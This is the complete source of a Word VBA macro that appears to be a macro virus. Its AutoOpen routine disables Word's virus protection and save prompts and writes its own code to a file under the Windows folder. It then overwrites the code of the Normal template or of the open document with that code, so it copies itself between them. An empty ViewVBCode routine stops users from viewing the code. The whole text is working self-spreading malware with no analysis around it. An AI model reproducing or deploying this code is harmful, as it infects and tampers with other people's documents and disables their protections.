   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   '$$0000005
   Const SluzhFile = "c:\windows\class.sys"
   Sub AutoOpen()
       On Error GoTo out
       Options.VirusProtection = False
       Options.SaveNormalPrompt = False
       Options.ConfirmConversions = False
       ad = Val(Right(Trim(ActiveDocument.VBProject.VBComponents.Item(1).codemodule.Lines(1, 1)), 7))
       nt = Val(Right(Trim(NormalTemplate.VBProject.VBComponents.Item(1).codemodule.Lines(1, 1)), 7))
       If nt = 0 Or nt < ad Then
           Set Host = NormalTemplate.VBProject.VBComponents.Item(1)
           ActiveDocument.VBProject.VBComponents.Item(1).export SluzhFile
       Else
           If ad = 0 Or ad < nt Then Set Host = ActiveDocument.VBProject.VBComponents.Item(1) Else GoTo out
       End If
       While Host.codemodule.CountOfLines > 0
          Host.codemodule.deletelines 1
       Wend
       Host.codemodule.AddFromFile (SluzhFile)
       For x = 1 To 4
           Host.codemodule.deletelines 1
       Next x
       If nt = 0 Or nt < ad Then
           Host.codemodule.replaceline 3, "Sub AutoClose()"
           Host.codemodule.replaceline 29, "Sub ToolsMacro()"
       End If
   out:
   End Sub
   Sub ViewVBCode()
   End Sub
